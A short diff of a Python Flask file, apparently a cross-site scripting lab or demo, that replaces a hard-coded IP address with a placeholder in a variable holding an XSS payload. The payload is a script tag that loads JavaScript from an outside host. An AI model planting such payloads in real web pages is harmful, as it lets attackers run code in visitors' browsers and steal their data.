@@ -4,7 +4,7 @@ from flask import Flask, request, redirect, url_for, render_template_string
 
 app = Flask(__name__)
 
-xss_payload = '<script src="http://20.197.10.26/xss/badjs/bad.js"></script>'
+xss_payload = '<script src="http://WEB VM Public IP/badjs/bad.js"></script>'
 
 html_template = """
 <html>
